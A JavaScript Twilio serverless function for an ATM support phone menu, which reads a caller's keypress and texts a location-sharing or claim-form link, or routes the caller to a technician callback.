exports.handler = async (context, event, callback) => {
  const twiml = new Twilio.twiml.VoiceResponse();
  const voice = 'Polly.Joanna-Neural';
  const client = context.getTwilioClient();

  const SMS_FROM = context.SMS_FROM || '';
  const GEO_URL  = context.GEO_URL  || '';   // e.g. https://citvan-clean-.../assist.html?mode=geo
  const CLAIM_LINK = context.CLAIM_LINK || '';

  const step = (event.step || 'start').toLowerCase();
  const n = Number(event.n || 0);
  const digits = (event.Digits || '').trim();
  const from = (event.From || '').trim();

  const say = (t) => twiml.say({ voice, language:'en-US' }, t);

  const sendSms = async (to, body) => {
    if (!to || !SMS_FROM) return;
    try {
      await client.messages.create({ to, from: SMS_FROM, body });
      console.log('[issues-mini] sms sent', { to });
    } catch (e) {
      console.log('[issues-mini] sms error', e.message);
    }
  };

  const goodbyeMoreInfo = () => {
    say('Okay, call us back if you would like more information. Goodbye.');
    twiml.hangup();
    return callback(null, twiml);
  };

  const cardStuckScript = () => {
    say('Okay, I’m sending you a secure text link to locate the A T M. Please tap the link to share your location, which will enable us to automatically reboot the A T M. Once the power is cut, you’ll be able to retrieve your card. If the A T M doesn’t power off and it\'s safe to do so, you or someone else can unplug the A T M. If you\'re still unable to get your card, please call us back and select option 4. A technician will return your call. Thank you for contacting A T M support. Goodbye.');
    twiml.hangup();
  };

  const screenFrozenScript = () => {
    say('Okay, I’m sending you a secure text link to locate the A T M. Please tap the link to share your location, which will enable us to automatically reboot the A T M. This will reset the A T M, and it should be ready for use once it powers back up. This action will also release your card if it’s currently stuck. If the A T M doesn’t power off and it\'s safe to do so, you or someone else can unplug the A T M. If you\'re still unable to get your card, please call us back and select option 4. A technician will return your call. Thank you for contacting A T M support. Goodbye.');
    twiml.hangup();
  };

  const claimScript = () => {
    say('I\'ve sent you a text message with a link to the claim form. Please fill it out and our team will follow up. Thanks for calling A T M support. Goodbye.');
    twiml.hangup();
  };

  if (step === 'start') {
    const g = twiml.gather({
      method: 'POST',
      input: 'dtmf',
      numDigits: 1,
      timeout: 7,
      action: '/issues-mini?step=menu',
      actionOnEmptyResult: true,
    });
    g.say({ voice, language: 'en-US' },
      'If you\'re having an issue with a stuck card, press 1. If the screen is frozen, press 2. If you didn\'t get your money, press 3. For any other issue, press 4.');
    if (n < 1) {
      twiml.redirect({ method: 'POST' }, `/issues-mini?step=start&n=${n+1}`);
    } else {
      return goodbyeMoreInfo();
    }
    return callback(null, twiml);
  }

  if (step === 'menu') {
    switch (digits) {
      case '1': { // card stuck
        if (from && GEO_URL) await sendSms(from, `Please click the link to share your ATM location: ${GEO_URL}`);
        cardStuckScript();
        return callback(null, twiml);
      }
      case '2': { // screen frozen
        if (from && GEO_URL) await sendSms(from, `Please click the link to share your ATM location: ${GEO_URL}`);
        screenFrozenScript();
        return callback(null, twiml);
      }
      case '3': { // didn’t get money
        const link = CLAIM_LINK || (context.WEBSITE_URL ? `${context.WEBSITE_URL}/claim` : '');
        if (from && link) await sendSms(from, `Claim form: ${link}`);
        claimScript();
        return callback(null, twiml);
      }
      case '4': { // other -> tech callback
        twiml.redirect({ method: 'POST' }, '/tech-callback?step=start&reason=issues_other');
        return callback(null, twiml);
      }
      default:
        if (n < 1) {
          const g = twiml.gather({
            method: 'POST',
            input: 'dtmf',
            numDigits: 1,
            timeout: 5,
            action: '/issues-mini?step=menu',
            actionOnEmptyResult: true,
          });
          g.say({ voice }, 'Sorry, I didn\'t get that. Press 1 for stuck card, 2 for screen frozen, 3 for didn\'t get money, or 4 for other issues.');
          twiml.redirect({ method: 'POST' }, `/issues-mini?step=menu&n=${n+1}`);
          return callback(null, twiml);
        }
        return goodbyeMoreInfo();
    }
  }

  // fallback
  twiml.redirect({ method: 'POST' }, '/issues-mini?step=start');
  return callback(null, twiml);
};
